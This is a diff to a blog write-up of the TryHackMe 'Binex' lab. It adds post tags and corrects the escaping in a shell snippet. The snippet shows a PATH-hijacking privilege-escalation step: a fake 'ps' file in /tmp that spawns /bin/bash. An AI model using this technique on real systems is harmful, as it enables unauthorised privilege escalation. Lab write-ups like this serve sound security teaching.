@@ -36,6 +36,10 @@ images:
 aliases:
     - "/binex-tryhackme-c07c3423186e"
 
+
+tags:
+- Machine
+- BOF
 ---
 
 ![image](/posts/2021-04-01_binextryhackme/images/1.png#layoutTextWidth)
@@ -237,7 +241,7 @@ We can stage our attack as follows - Create our own ps file that spawns a shell 
 
 ```bash
 kel@THM_exploit:~$ cd /tmp  
-kel@THM_exploit:/tmp$ echo “/bin/bash” &gt; ps  
+kel@THM_exploit:/tmp$ echo “/bin/bash” > ps  
 kel@THM_exploit:/tmp$ chmod 777 ps  
 kel@THM_exploit:/tmp$ echo $PATH  
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
